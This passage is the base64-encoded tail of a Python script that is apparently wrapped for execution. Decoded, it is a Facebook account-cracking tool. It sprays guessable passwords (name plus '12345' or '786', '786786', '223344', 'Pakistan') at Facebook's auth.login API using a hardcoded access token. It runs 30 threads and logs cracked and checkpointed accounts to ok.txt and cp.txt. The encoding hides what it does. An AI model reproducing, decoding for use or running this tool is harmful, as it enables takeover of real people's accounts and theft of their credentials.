ICBjcC53cml0ZSh1aWQrIiB8ICIrcGFzczIrIlxuIikKCgkJICAgICAgICAgICAgICAgIGNwLmNsb3NlKCkKCgkJICAgICAgICAgICAgICAgIGNwcy5hcHBlbmQodWlkKQoKCQkgICAgICAgICAgICBlbHNlOgoKCQkgICAgICAgICAgICAgICAgaWYgJ2FjY2Vzc190b2tlbicgaW4gZDoKCgkJICAgICAgICAgICAgICAgICAgICBwcmludCgiXHgxYlsxOzk2bVtTdWNjZXNzZnVsbF0gIit1aWQrIiB8ICIrcGFzczIrIlx4MWJbMTswbSIpCgoJCSAgICAgICAgICAgICAgICAgICAgb2s9b3Blbigib2sudHh0IiwiYSIpCgoJCSAgICAgICAgICAgICAgICAgICAgb2sud3JpdGUodWlkKyIgfCAiK3Bhc3MyKyJcbiIpCgoJCSAgICAgICAgICAgICAgICAgICAgb2suY2xvc2UoKQoKCQkgICAgICAgICAgICAgICAgICAgIG9rcy5hcHBlbmQodWlkKQoKCQkgICAgICAgICAgICAgICAgZWxzZToKCgkJICAgICAgICAgICAgICAgICAgICBwYXNzMz1uYW1lKyIxMjM0NSIKCgkJICAgICAgICAgICAgICAgICAgICBxID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2ItYXBpLmZhY2Vib29rLmNvbS9tZXRob2QvYXV0aC5sb2dpbj9hY2Nlc3NfdG9rZW49MjM3NzU5OTA5NTkxNjU1JTI1MjU3QzBmMTQwYWFiZWRmYjY1YWMyN2E3MzllZDFhMjI2M2IxJmZvcm1hdD1qc29uJnNka192ZXJzaW9uPTImZW1haWw9IiArIHVpZCArICImbG9jYWxlPXZpX3ZuJnBhc3N3b3JkPSIgKyBwYXNzMyArICImc2RrPWlvcyZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZzaWc9MTVkZjVmM2M4YzM3ZTBhNjIwZThmYTFmZDFkZDcwNWMiLCBoZWFkZXJzPWhlYWRlcikudGV4dAoKCQkgICAgICAgICAgICAgICAgICAgIGQ9anNvbi5sb2FkcyhxKQoKCQkgICAgICAgICAgICAgICAgICAgIGlmICd3d3cuZmFjZWJvb2suY29tJyBpbiBkWydlcnJvcl9tc2cnXToKCgkJICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoIlwwMzNbMTs5Nm1bSGFtaWktQ1BdICIrdWlkKyIgfCAiK3Bhc3MzKQoKCQkgICAgICAgICAgICAgICAgICAgICAgICBjcD1vcGVuKCJvay50eHQiLCJhIikKCgkJICAgICAgICAgICAgICAgICAgICAgICAgY3Aud3JpdGUodWlkKyIgfCAiK3Bhc3MzKyJcbiIpCgoJCSAgICAgICAgICAgICAgICAgICAgICAgIGNwLmNsb3NlKCkKCgkJICAgICAgICAgICAgICAgICAgICAgICAgY3BzLmFwcGVuZCh1aWQpCgoJCSAgICAgICAgICAgICAgICAgICAgZWxzZToKCgkJICAgICAgICAgICAgICAgICAgICAgICAgaWYgJ2FjY2Vzc190b2tlbicgaW4gZDoKCgkJICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCIgXHgxYlsxOzk2bVtTdWNjZXNzZnVsbF0gIit1aWQrIiB8ICIrcGFzczMrIlx4MWJbMTswbSIpCgoJCSAgICAgICAgICAgICAgICAgICAgICAgICAgICBvaz1vcGVuKCJvay50eHQiLCJhIikKCgkJICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9rLndyaXRlKHVpZCsiIHwgIitwYXNzMysiXG4iKQoKCQkgICAgICAgICAgICAgICAgICAgICAgICAgICAgb2suY2xvc2UoKQoKCQkgICAgICAgICAgICAgICAgICAgICAgICAgICAgb2tzLmFwcGVuZCh1aWQpCgoJCSAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6CgoJCSAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXNzND1uYW1lKyI3ODYiCgoJCSAgICAgICAgICAgICAgICAgICAgICAgICAgICBxID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2ItYXBpLmZhY2Vib29rLmNvbS9tZXRob2QvYXV0aC5sb2dpbj9hY2Nlc3NfdG9rZW49MjM3NzU5OTA5NTkxNjU1JTI1MjU3QzBmMTQwYWFiZWRmYjY1YWMyN2E3MzllZDFhMjI2M2IxJmZvcm1hdD1qc29uJnNka192ZXJzaW9uPTImZW1haWw9IiArIHVpZCArICImbG9jYWxlPXZpX3ZuJnBhc3N3b3JkPSIgKyBwYXNzNCArICImc2RrPWlvcyZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZzaWc9MTVkZjVmM2M4YzM3ZTBhNjIwZThmYTFmZDFkZDcwNWMiLCBoZWFkZXJzPWhlYWRlcikudGV4dAoKCQkgICAgICAgICAgICAgICAgICAgICAgICAgICAgZD1qc29uLmxvYWRzKHEpCgoJCSAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAnd3d3LmZhY2Vib29rLmNvbScgaW4gZFsnZXJyb3JfbXNnJ106CgoJCSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoIlwwMzNbMTs5Nm1bSGFzc2FuLUNQXSAiK3VpZCsiIHwgIitwYXNzNCkKCgkJICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjcD1vcGVuKCJjcC50eHQiLCJhIikKCgkJICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjcC53cml0ZSh1aWQrIiB8ICIrcGFzczQrIlxuIikKCgkJICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjcC5jbG9zZSgpCgoJCSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY3BzLmFwcGVuZCh1aWQpCgoJCSAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlOgoKCQkgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICdhY2Nlc3NfdG9rZW4nIGluIGQ6CgoJCSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCJceDFiWzE7OTZtW1N1Y2Nlc3NmdWxsXSAiK3VpZCsiIHwgIitwYXNzNCsiXHgxYlsxOzBtIikKCgkJICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgb2s9b3Blbigib2sudHh0IiwiYSIpCgoJCSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9rLndyaXRlKHVpZCsiIHwgIitwYXNzNCsiXG4iKQoKCQkgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBvay5jbG9zZSgpCgoJCSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9rcy5hcHBlbmQodWlkKQoKCQkgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6CgoJCSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhc3M1PSI3ODY3ODYiCgoJCSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHEgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0PWpzb24mc2RrX3ZlcnNpb249MiZlbWFpbD0iICsgdWlkICsgIiZsb2NhbGU9dmlfdm4mcGFzc3dvcmQ9IiArIHBhc3M1ICsgIiZzZGs9aW9zJmdlbmVyYXRlX3Nlc3Npb25fY29va2llcz0xJnNpZz0xNWRmNWYzYzhjMzdlMGE2MjBlOGZhMWZkMWRkNzA1YyIsIGhlYWRlcnM9aGVhZGVyKS50ZXh0CgoJCSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGQ9anNvbi5sb2FkcyhxKQoKCQkgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAnd3d3LmZhY2Vib29rLmNvbScgaW4gZFsnZXJyb3JfbXNnJ106CgoJCSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCgiXDAzM1sxOzk2bVtIYXNzYW4tQ1BdICIrdWlkKyIgfCAiK3Bhc3M1KQoKCQkgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY3A9b3BlbigiY3AudHh0IiwiYSIpCgoJCSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjcC53cml0ZSh1aWQrIiB8ICIrcGFzczUrIlxuIikKCgkJICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNwLmNsb3NlKCkKCgkJICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNwcy5hcHBlbmQodWlkKQoKCQkgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlOgoKCQkgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgJ2FjY2Vzc190b2tlbicgaW4gZDoKCgkJICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCgiXHgxYlsxOzk2bVtTdWNjZXNzZnVsbF0gIit1aWQrIiB8ICIrcGFzczUrIlx4MWJbMTswbSIpCgoJCSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgb2s9b3Blbigib2sudHh0IiwiYSIpCgoJCSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgb2sud3JpdGUodWlkKyIgfCAiK3Bhc3M1KyJcbiIpCgoJCSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgb2suY2xvc2UoKQoKCQkgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9rcy5hcHBlbmQodWlkKQoKCQkgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZToKCgkJICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXNzNj0iMjIzMzQ0IgoKCQkgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHEgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0PWpzb24mc2RrX3ZlcnNpb249MiZlbWFpbD0iICsgdWlkICsgIiZsb2NhbGU9dmlfdm4mcGFzc3dvcmQ9IiArIHBhc3M2ICsgIiZzZGs9aW9zJmdlbmVyYXRlX3Nlc3Npb25fY29va2llcz0xJnNpZz0xNWRmNWYzYzhjMzdlMGE2MjBlOGZhMWZkMWRkNzA1YyIsIGhlYWRlcnM9aGVhZGVyKS50ZXh0CgoJCSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZD1qc29uLmxvYWRzKHEpCgoJCSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgJ3d3dy5mYWNlYm9vay5jb20nIGluIGRbJ2Vycm9yX21zZyddOgoKCQkgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCgiXDAzM1sxOzk2bVtIYXNzYW4tQ1BdICIrdWlkKyIgfCAiK3Bhc3M2KQoKCQkgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjcD1vcGVuKCJjcC50eHQiLCJhIikKCgkJICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY3Aud3JpdGUodWlkKyIgfCAiK3Bhc3M2KyJcbiIpCgoJCSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNwLmNsb3NlKCkKCgkJICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY3BzLmFwcGVuZCh1aWQpCgoJCSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZToKCgkJICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgJ2FjY2Vzc190b2tlbicgaW4gZDoKCgkJICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCJceDFiWzE7OTZtW1N1Y2Nlc3NmdWxsXSAiK3VpZCsiIHwgIitwYXNzNisiXHgxYlsxOzBtIikKCgkJICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9rPW9wZW4oIm9rLnR4dCIsImEiKQoKCQkgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgb2sud3JpdGUodWlkKyIgfCAiK3Bhc3M2KyJcbiIpCgoJCSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBvay5jbG9zZSgpCgoJCSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBva3MuYXBwZW5kKHVpZCkKCgkJICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZToKCgkJICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhc3M3PSJQYWtpc3RhbiIKCgkJICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHEgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0PWpzb24mc2RrX3ZlcnNpb249MiZlbWFpbD0iICsgdWlkICsgIiZsb2NhbGU9dmlfdm4mcGFzc3dvcmQ9IiArIHBhc3M3ICsgIiZzZGs9aW9zJmdlbmVyYXRlX3Nlc3Npb25fY29va2llcz0xJnNpZz0xNWRmNWYzYzhjMzdlMGE2MjBlOGZhMWZkMWRkNzA1YyIsIGhlYWRlcnM9aGVhZGVyKS50ZXh0CgoJCSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkPWpzb24ubG9hZHMocSkKCgkJICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICd3d3cuZmFjZWJvb2suY29tJyBpbiBkWydlcnJvcl9tc2cnXToKCgkJICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCgiXDAzM1sxOzk2bVtIYXNzYW4tQ1BdICIrdWlkKyIgfCAiK3Bhc3M3KQoKCQkgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNwPW9wZW4oImNwLnR4dCIsImEiKQoKCQkgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNwLndyaXRlKHVpZCsiIHwgIitwYXNzNysiXG4iKQoKCQkgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNwLmNsb3NlKCkKCgkJICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjcHMuYXBwZW5kKHVpZCkKCgkJICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6CgoJCSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgJ2FjY2Vzc190b2tlbicgaW4gZDoKCgkJICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoIlx4MWJbMTs5Nm1bU3VjY2Vzc2Z1bGxdICIrdWlkKyIgfCAiK3Bhc3M3KyJceDFiWzE7MG0iKQoKCQkgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBvaz1vcGVuKCJvay50eHQiLCJhIikKCgkJICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgb2sud3JpdGUodWlkKyIgfCAiK3Bhc3M3KyJcbiIpCgoJCSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9rLmNsb3NlKCkKCgkJICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgb2tzLmFwcGVuZCh1aWQpCgoJCQkJCQkJCQkKCgkJCQkJCQkJCQkJCQkJCQoKCQlleGNlcHQ6CgoJCQlwYXNzCgoJCQoKCXAgPSBUaHJlYWRQb29sKDMwKQoKCXAubWFwKG1haW4sIGlkKQoKCXByaW50ICgiICIpCgoJcHJpbnQgKDQ3KiItIikKCglwcmludCAoIlshXSBQcm9jZXNzIGhhcyBjb21wbGV0ZWQiKQoKCXByaW50ICgiWyFdIFRvdGFsIENwL09rIDogIitzdHIobGVuKGNwcykpICsgIi8iK3N0cihsZW4ob2tzKSkpCgoJcHJpbnQgKDQ3KiItIikKCglyYXdfaW5wdXQoIlx0XHgxYlswOzk3bVByZXNzIGVudGVyIHRvIG1haW4gbWVudSBiYWNrIikKCgltZW51KCkKCgkKCmlmIF9fbmFtZV9fID09ICdfX21haW5fXyc6CgogICAgbWFpbigpCgojOENEMDQ4Cg=="))